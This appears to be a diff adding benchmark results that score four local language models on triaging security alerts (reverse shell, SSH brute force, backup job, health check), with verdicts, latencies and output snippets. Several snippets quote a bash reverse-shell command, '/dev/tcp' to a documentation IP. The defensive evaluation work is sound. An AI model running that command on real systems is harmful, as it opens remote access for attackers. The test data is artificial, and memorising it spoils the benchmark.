@@ -1,0 +1,542 @@
+[
+  {
+    "model": "mistral:7b",
+    "system_suffix": "",
+    "benchmark_timeout_s": 120,
+    "size_gb": 4.37,
+    "load_s": 7.4,
+    "verdict_agreement": 0.75,
+    "contract_validity": 1,
+    "explanation_ok": 1,
+    "prod_sla_ok": 1,
+    "latency_verdict_ms": 20515,
+    "latency_explanation_ms": 19241,
+    "quality": 0.85,
+    "quality_per_gb": 0.195,
+    "verdict_runs": [
+      {
+        "case": "reverse_shell",
+        "known": "true_positive",
+        "verdict": "true_positive",
+        "agree": true,
+        "contract_ok": true,
+        "latency_ms": 24895,
+        "prod_sla_ok": true,
+        "raw_snippet": " {\"verdict\": \"true_positive\",\n\"confidence\": 0.95,\n\"rationale\": \"The evidence shows an execution of a command ('sh -i >& /dev/tcp/203.0.113.50/4444 0>&1') that establishes a reverse shell connection to the IP address 203.0.113.50 on port 4444. This is a known technique used in reverse shell attacks. Additionally, there is no listener on port 4444 before the outbound connection, and no persistence e"
+      },
+      {
+        "case": "reverse_shell",
+        "known": "true_positive",
+        "verdict": "true_positive",
+        "agree": true,
+        "contract_ok": true,
+        "latency_ms": 22630,
+        "prod_sla_ok": true,
+        "raw_snippet": " {\"verdict\": \"true_positive\",\n\"confidence\": 0.95,\n\"rationale\": \"The evidence shows an execution of a command ('sh -i >& /dev/tcp/203.0.113.50/4444 0>&1') that establishes a reverse shell connection to the IP address 203.0.113.50 on port 4444. This is a known technique used in reverse shell attacks. Additionally, there is no listener on port 4444 before the outbound connection, and no persistence e"
+      },
+      {
+        "case": "brute_force_to_success",
+        "known": "true_positive",
+        "verdict": "true_positive",
+        "agree": true,
+        "contract_ok": true,
+        "latency_ms": 23094,
+        "prod_sla_ok": true,
+        "raw_snippet": " {\"verdict\": \"true_positive\",\n\"confidence\": 0.9,\n\"rationale\": \"The investigation objective and hypotheses indicate a brute force attack on the 'auth_shipper' table for the user 'admin'. The evidence shows multiple failed authentication attempts from the IP address '198.51.100.23' within a 10-minute window, followed by a successful authentication. Additionally, the 'ssh' process with the command 's"
+      },
+      {
+        "case": "brute_force_to_success",
+        "known": "true_positive",
+        "verdict": "true_positive",
+        "agree": true,
+        "contract_ok": true,
+        "latency_ms": 20812,
+        "prod_sla_ok": true,
+        "raw_snippet": " {\"verdict\": \"true_positive\",\n\"confidence\": 0.9,\n\"rationale\": \"The investigation objective and hypotheses indicate a brute force attack attempt on the 'auth_shipper' table for the user 'admin'. The evidence shows multiple failed authentication attempts from the IP address '198.51.100.23' within a 10-minute window, followed by a successful authentication. Additionally, the 'ssh' process with the co"
+      },
+      {
+        "case": "backup_job",
+        "known": "benign",
+        "verdict": "benign",
+        "agree": true,
+        "contract_ok": true,
+        "latency_ms": 19167,
+        "prod_sla_ok": true,
+        "raw_snippet": " {\"verdict\": \"benign\",\n\"confidence\": 0.9,\n\"rationale\": \"The activity appears to be a scheduled backup job (hypothesis confirmed by the evidence). The 'backup.sh' script spawned on 'db-prod-01' is documented as part of the daily backup schedule. The command line 'tar -czf /var/backups/db-2026-09-13.tgz /var/lib/db' is a common command for creating a compressed archive of a directory. The evidence s"
+      },
+      {
+        "case": "backup_job",
+        "known": "benign",
+        "verdict": "benign",
+        "agree": true,
+        "contract_ok": true,
+        "latency_ms": 16636,
+        "prod_sla_ok": true,
+        "raw_snippet": " {\n  \"verdict\": \"benign\",\n  \"confidence\": 0.9,\n  \"rationale\": \"The activity appears to be a scheduled backup job, as indicated by the 'backup.sh' script and the 'tar' command, which is a common tool for creating archives. The event time matches the documented 02:00 daily backup schedule. Additionally, there are no external destinations detected, indicating that the data is being written locally on"
+      },
+      {
+        "case": "health_check",
+        "known": "benign",
+        "verdict": "needs_review",
+        "agree": false,
+        "contract_ok": true,
+        "latency_ms": 19092,
+        "prod_sla_ok": true,
+        "raw_snippet": " {\"verdict\": \"needs_review\",\n\"confidence\": 0.6,\n\"rationale\": \"Repeated curl processes on the SIEM host with a fixed command and no file modifications outside the watchdog state file suggest a scheduled health check or automated process. However, the absence of any context or additional information about the 'com.scarletai.health-watchdog' process and the API endpoint 'http://127.0.0.1:8000/api/v1/"
+      },
+      {
+        "case": "health_check",
+        "known": "benign",
+        "verdict": "needs_review",
+        "agree": false,
+        "contract_ok": true,
+        "latency_ms": 17793,
+        "prod_sla_ok": true,
+        "raw_snippet": " {\n  \"verdict\": \"needs_review\",\n  \"confidence\": 0.6,\n  \"rationale\": \"Repeated curl processes on the SIEM host with a fixed command and no file modifications outside the watchdog state file suggest a scheduled health check or automated process. However, the absence of any context or additional information about the 'com.scarletai.health-watchdog' process and the API endpoint being accessed raises c"
+      }
+    ],
+    "explanation_runs": [
+      {
+        "case": "reverse_shell_alert",
+        "source": "ollama",
+        "grounded": true,
+        "ok": true,
+        "latency_ms": 20676,
+        "prod_sla_ok": true,
+        "raw_snippet": " **What happened**: A critical security alert has been triggered due to the detection of a command-line reverse shell construct on the host 'web-prod-01'. The alert indicates an attempt to establish a connection with the IP address 203.0.113.50 on port 4444.\n\n**Why it matters**: This activity is associated with MITRE ATT&CK techniques T1059.004 (Command and Scripting Interpreter) and T1071 (Remote"
+      },
+      {
+        "case": "reverse_shell_alert",
+        "source": "ollama",
+        "grounded": true,
+        "ok": true,
+        "latency_ms": 19664,
+        "prod_sla_ok": true,
+        "raw_snippet": " **What happened**: A command-line reverse shell construct has been detected on the host 'web-prod-01'. The detected activity involves the execution of a shell command that attempts to connect to the IP address '203.0.113.50' on port 4444.\n\n**Why it matters**: This activity is classified as CRITICAL due to the potential for remote code execution, which could lead to unauthorized access, data theft"
+      },
+      {
+        "case": "brute_force_alert",
+        "source": "ollama",
+        "grounded": true,
+        "ok": true,
+        "latency_ms": 18730,
+        "prod_sla_ok": true,
+        "raw_snippet": " **What happened**: There was a successful SSH login after repeated failures from the IP address 198.51.100.23 on the host web-prod-02. This sequence of events matches the rule 'ssh_success_after_failures'.\n\n**Why it matters**: This activity could indicate a brute-force attack or an attempt to exploit weak credentials, posing a significant security risk as unauthorized access could lead to data br"
+      },
+      {
+        "case": "brute_force_alert",
+        "source": "ollama",
+        "grounded": true,
+        "ok": true,
+        "latency_ms": 17895,
+        "prod_sla_ok": true,
+        "raw_snippet": " **What happened**: There was a successful SSH login after repeated failures from the IP address 198.51.100.23 on the host web-prod-02. This event is flagged as critical due to multiple failed attempts before success.\n\n**Why it matters**: The repeated failed login attempts followed by a successful one could indicate a brute-force attack, potentially attempting to gain unauthorized access to the sy"
+      }
+    ]
+  },
+  {
+    "model": "phi4-mini",
+    "system_suffix": "",
+    "benchmark_timeout_s": 120,
+    "size_gb": 2.49,
+    "load_s": 2.3,
+    "verdict_agreement": 0.75,
+    "contract_validity": 0.25,
+    "explanation_ok": 0.5,
+    "prod_sla_ok": 1,
+    "latency_verdict_ms": 10214,
+    "latency_explanation_ms": 8286,
+    "quality": 0.6,
+    "quality_per_gb": 0.241,
+    "verdict_runs": [
+      {
+        "case": "reverse_shell",
+        "known": "true_positive",
+        "verdict": "true_positive",
+        "agree": true,
+        "contract_ok": false,
+        "latency_ms": 12475,
+        "prod_sla_ok": true,
+        "raw_snippet": "```json\n{\n  \"verdict\": \"true_positive\",\n  \"confidence\": \"0.85\",\n  \"rationale\": \"The telemetry indicates the execution of a reverse shell command to an external IP address (203.0.113.50) on port 4444, which is a common indicator of a reverse shell being used for malicious purposes. The presence of an outbound connection to this IP address and the absence of a listener on the same port before the co"
+      },
+      {
+        "case": "reverse_shell",
+        "known": "true_positive",
+        "verdict": "true_positive",
+        "agree": true,
+        "contract_ok": false,
+        "latency_ms": 10420,
+        "prod_sla_ok": true,
+        "raw_snippet": "```json\n{\n  \"verdict\": \"true_positive\",\n  \"confidence\": \"0.85\",\n  \"rationale\": \"The telemetry indicates the execution of a reverse shell command to an external IP address (203.0.113.50) on port 4444, which is a common indicator of a reverse shell being used for malicious purposes. The presence of an outbound connection to this IP address and the absence of a listener on the same port before the co"
+      },
+      {
+        "case": "brute_force_to_success",
+        "known": "true_positive",
+        "verdict": "true_positive",
+        "agree": true,
+        "contract_ok": false,
+        "latency_ms": 11494,
+        "prod_sla_ok": true,
+        "raw_snippet": "```json\n{\n  \"verdict\": \"true_positive\",\n  \"confidence\": \"0.75\",\n  \"rationale\": \"The evidence indicates multiple failed authentication attempts (auth_failed) for the 'admin' user from a single IP address (198.51.100.23) within a short time window (10 minutes), followed by a successful authentication (auth_success) for the same user. This pattern is consistent with a brute force attack attempt.\",\n  "
+      },
+      {
+        "case": "brute_force_to_success",
+        "known": "true_positive",
+        "verdict": "true_positive",
+        "agree": true,
+        "contract_ok": false,
+        "latency_ms": 13299,
+        "prod_sla_ok": true,
+        "raw_snippet": "```json\n{\n  \"verdict\": \"true_positive\",\n  \"confidence\": \"0.75\",\n  \"rationale\": \"The evidence indicates multiple failed authentication attempts (auth_failed) for the 'admin' user from a single IP address (198.51.100.23) within a short time window (10 minutes), followed by a successful authentication (auth_success) for the same user. This pattern is consistent with a brute force attack attempt.\",\n  "
+      },
+      {
+        "case": "backup_job",
+        "known": "benign",
+        "verdict": "benign",
+        "agree": true,
+        "contract_ok": true,
+        "latency_ms": 8789,
+        "prod_sla_ok": true,
+        "raw_snippet": "```json\n{\n  \"verdict\": \"benign\",\n  \"confidence\": 0.8,\n  \"rationale\": \"The investigation reveals that a backup job was initiated at 02:00 as per the documented daily backup schedule. The use of 'tar' to create a compressed backup file suggests a routine backup process. There are no external connections, indicating that the process is local and not attempting to exfiltrate data or communicate with a"
+      },
+      {
+        "case": "backup_job",
+        "known": "benign",
+        "verdict": "benign",
+        "agree": true,
+        "contract_ok": true,
+        "latency_ms": 5986,
+        "prod_sla_ok": true,
+        "raw_snippet": "```json\n{\n  \"verdict\": \"benign\",\n  \"confidence\": 0.8,\n  \"rationale\": \"The investigation reveals that a backup job was initiated at 02:00 as per the documented daily backup schedule. The use of 'tar' to create a compressed backup file suggests a routine backup process. There are no external connections, indicating that the process is local and not attempting to exfiltrate data or communicate with a"
+      },
+      {
+        "case": "health_check",
+        "known": "benign",
+        "verdict": "true_positive",
+        "agree": false,
+        "contract_ok": false,
+        "latency_ms": 9974,
+        "prod_sla_ok": true,
+        "raw_snippet": "```json\n{\n  \"verdict\": \"true_positive\",\n  \"confidence\": \"0.75\",\n  \"rationale\": \"The investigation reveals repeated curl processes running every 60 seconds to check the health of an internal API endpoint on the SIEM host. This behavior could indicate a monitoring or health-check mechanism, but the frequency and the specific target (http://127.0.0.1:8000/api/v1/health) are unusual for a standard hea"
+      },
+      {
+        "case": "health_check",
+        "known": "benign",
+        "verdict": "true_positive",
+        "agree": false,
+        "contract_ok": false,
+        "latency_ms": 9278,
+        "prod_sla_ok": true,
+        "raw_snippet": "```json\n{\n  \"verdict\": \"true_positive\",\n  \"confidence\": \"0.75\",\n  \"rationale\": \"The investigation reveals repeated curl processes running every 60 seconds to check the health of an internal API endpoint on the SIEM host. This behavior could indicate a monitoring or health-check mechanism, but the frequency and the specific target (http://127.0.0.1:8000/api/v1/health) are unusual for a standard hea"
+      }
+    ],
+    "explanation_runs": [
+      {
+        "case": "reverse_shell_alert",
+        "source": "ollama",
+        "grounded": false,
+        "ok": false,
+        "latency_ms": 9499,
+        "prod_sla_ok": true,
+        "raw_snippet": "1. **What happened**: A command-line reverse shell was detected on the host named 'ingest-fed', which is influenced by an attacker. The command used to establish the reverse shell is `sh -i >& /dev/tcp/203.0.113.50/4444 0>&1`, indicating an attempt to connect back to the IP address 203.0.113.50 on port 4444.\n\n2. **Why it matters**: This is a CRITICAL alert because it suggests that an attacker has "
+      },
+      {
+        "case": "reverse_shell_alert",
+        "source": "ollama",
+        "grounded": false,
+        "ok": false,
+        "latency_ms": 8788,
+        "prod_sla_ok": true,
+        "raw_snippet": "1. **What happened**: A command-line reverse shell was detected on the host named 'ingest-fed', which is influenced by an attacker. The command used to establish the reverse shell is `sh -i >& /dev/tcp/203.0.113.50/4444 0>&1`.\n2. **Why it matters**: This is a CRITICAL alert because it indicates that an attacker has gained unauthorized access to the host, potentially allowing them to execute arbitr"
+      },
+      {
+        "case": "brute_force_alert",
+        "source": "ollama",
+        "grounded": true,
+        "ok": true,
+        "latency_ms": 8208,
+        "prod_sla_ok": true,
+        "raw_snippet": "1. **What happened**: An SSH login was successfully achieved on a host after five consecutive failed attempts from the same source IP and user 'admin'.\n2. **Why it matters**: This is a critical alert because it may indicate a brute force attack attempt, which could lead to unauthorized access and potential compromise of the system. The repeated failures followed by a success could mean that an att"
+      },
+      {
+        "case": "brute_force_alert",
+        "source": "ollama",
+        "grounded": true,
+        "ok": true,
+        "latency_ms": 6647,
+        "prod_sla_ok": true,
+        "raw_snippet": "1. **What happened**: An SSH login was successful after five consecutive failed attempts from the IP address 198.51.100.23, using the username 'admin' on the host named 'ingest-fed'.\n2. **Why it matters**: This is a critical alert indicating a potential brute force attack or compromised credentials. The repeated failures followed by a successful login suggest that an attacker may have gained acces"
+      }
+    ]
+  },
+  {
+    "model": "qwen3.5:2b",
+    "system_suffix": "",
+    "benchmark_timeout_s": 120,
+    "size_gb": 2.74,
+    "load_s": 1.9,
+    "verdict_agreement": 0,
+    "contract_validity": 0,
+    "explanation_ok": 0,
+    "prod_sla_ok": 0,
+    "latency_verdict_ms": 0,
+    "latency_explanation_ms": 0,
+    "quality": 0.0,
+    "quality_per_gb": 0.0,
+    "verdict_runs": [
+      {
+        "case": "reverse_shell",
+        "known": "true_positive",
+        "verdict": null,
+        "agree": false,
+        "contract_ok": false,
+        "latency_ms": 0,
+        "prod_sla_ok": false,
+        "raw_snippet": ""
+      },
+      {
+        "case": "reverse_shell",
+        "known": "true_positive",
+        "verdict": null,
+        "agree": false,
+        "contract_ok": false,
+        "latency_ms": 0,
+        "prod_sla_ok": false,
+        "raw_snippet": ""
+      },
+      {
+        "case": "brute_force_to_success",
+        "known": "true_positive",
+        "verdict": null,
+        "agree": false,
+        "contract_ok": false,
+        "latency_ms": 0,
+        "prod_sla_ok": false,
+        "raw_snippet": ""
+      },
+      {
+        "case": "brute_force_to_success",
+        "known": "true_positive",
+        "verdict": null,
+        "agree": false,
+        "contract_ok": false,
+        "latency_ms": 0,
+        "prod_sla_ok": false,
+        "raw_snippet": ""
+      },
+      {
+        "case": "backup_job",
+        "known": "benign",
+        "verdict": null,
+        "agree": false,
+        "contract_ok": false,
+        "latency_ms": 0,
+        "prod_sla_ok": false,
+        "raw_snippet": ""
+      },
+      {
+        "case": "backup_job",
+        "known": "benign",
+        "verdict": null,
+        "agree": false,
+        "contract_ok": false,
+        "latency_ms": 0,
+        "prod_sla_ok": false,
+        "raw_snippet": ""
+      },
+      {
+        "case": "health_check",
+        "known": "benign",
+        "verdict": null,
+        "agree": false,
+        "contract_ok": false,
+        "latency_ms": 0,
+        "prod_sla_ok": false,
+        "raw_snippet": ""
+      },
+      {
+        "case": "health_check",
+        "known": "benign",
+        "verdict": null,
+        "agree": false,
+        "contract_ok": false,
+        "latency_ms": 0,
+        "prod_sla_ok": false,
+        "raw_snippet": ""
+      }
+    ],
+    "explanation_runs": [
+      {
+        "case": "reverse_shell_alert",
+        "source": "error",
+        "grounded": false,
+        "ok": false,
+        "latency_ms": 0,
+        "prod_sla_ok": false,
+        "raw_snippet": ""
+      },
+      {
+        "case": "reverse_shell_alert",
+        "source": "error",
+        "grounded": false,
+        "ok": false,
+        "latency_ms": 0,
+        "prod_sla_ok": false,
+        "raw_snippet": ""
+      },
+      {
+        "case": "brute_force_alert",
+        "source": "error",
+        "grounded": false,
+        "ok": false,
+        "latency_ms": 0,
+        "prod_sla_ok": false,
+        "raw_snippet": ""
+      },
+      {
+        "case": "brute_force_alert",
+        "source": "error",
+        "grounded": false,
+        "ok": false,
+        "latency_ms": 0,
+        "prod_sla_ok": false,
+        "raw_snippet": ""
+      }
+    ]
+  },
+  {
+    "model": "qwen3.5:9b",
+    "system_suffix": "",
+    "benchmark_timeout_s": 120,
+    "size_gb": 6.59,
+    "load_s": 4.2,
+    "verdict_agreement": 0,
+    "contract_validity": 0,
+    "explanation_ok": 0,
+    "prod_sla_ok": 0,
+    "latency_verdict_ms": 0,
+    "latency_explanation_ms": 0,
+    "quality": 0.0,
+    "quality_per_gb": 0.0,
+    "verdict_runs": [
+      {
+        "case": "reverse_shell",
+        "known": "true_positive",
+        "verdict": null,
+        "agree": false,
+        "contract_ok": false,
+        "latency_ms": 0,
+        "prod_sla_ok": false,
+        "raw_snippet": ""
+      },
+      {
+        "case": "reverse_shell",
+        "known": "true_positive",
+        "verdict": null,
+        "agree": false,
+        "contract_ok": false,
+        "latency_ms": 0,
+        "prod_sla_ok": false,
+        "raw_snippet": ""
+      },
+      {
+        "case": "brute_force_to_success",
+        "known": "true_positive",
+        "verdict": null,
+        "agree": false,
+        "contract_ok": false,
+        "latency_ms": 0,
+        "prod_sla_ok": false,
+        "raw_snippet": ""
+      },
+      {
+        "case": "brute_force_to_success",
+        "known": "true_positive",
+        "verdict": null,
+        "agree": false,
+        "contract_ok": false,
+        "latency_ms": 0,
+        "prod_sla_ok": false,
+        "raw_snippet": ""
+      },
+      {
+        "case": "backup_job",
+        "known": "benign",
+        "verdict": null,
+        "agree": false,
+        "contract_ok": false,
+        "latency_ms": 0,
+        "prod_sla_ok": false,
+        "raw_snippet": ""
+      },
+      {
+        "case": "backup_job",
+        "known": "benign",
+        "verdict": null,
+        "agree": false,
+        "contract_ok": false,
+        "latency_ms": 0,
+        "prod_sla_ok": false,
+        "raw_snippet": ""
+      },
+      {
+        "case": "health_check",
+        "known": "benign",
+        "verdict": null,
+        "agree": false,
+        "contract_ok": false,
+        "latency_ms": 0,
+        "prod_sla_ok": false,
+        "raw_snippet": ""
+      },
+      {
+        "case": "health_check",
+        "known": "benign",
+        "verdict": null,
+        "agree": false,
+        "contract_ok": false,
+        "latency_ms": 0,
+        "prod_sla_ok": false,
+        "raw_snippet": ""
+      }
+    ],
+    "explanation_runs": [
+      {
+        "case": "reverse_shell_alert",
+        "source": "error",
+        "grounded": false,
+        "ok": false,
+        "latency_ms": 0,
+        "prod_sla_ok": false,
+        "raw_snippet": ""
+      },
+      {
+        "case": "reverse_shell_alert",
+        "source": "error",
+        "grounded": false,
+        "ok": false,
+        "latency_ms": 0,
+        "prod_sla_ok": false,
+        "raw_snippet": ""
+      },
+      {
+        "case": "brute_force_alert",
+        "source": "error",
+        "grounded": false,
+        "ok": false,
+        "latency_ms": 0,
+        "prod_sla_ok": false,
+        "raw_snippet": ""
+      },
+      {
+        "case": "brute_force_alert",
+        "source": "error",
+        "grounded": false,
+        "ok": false,
+        "latency_ms": 0,
+        "prod_sla_ok": false,
+        "raw_snippet": ""
+      }
+    ]
+  }
+]
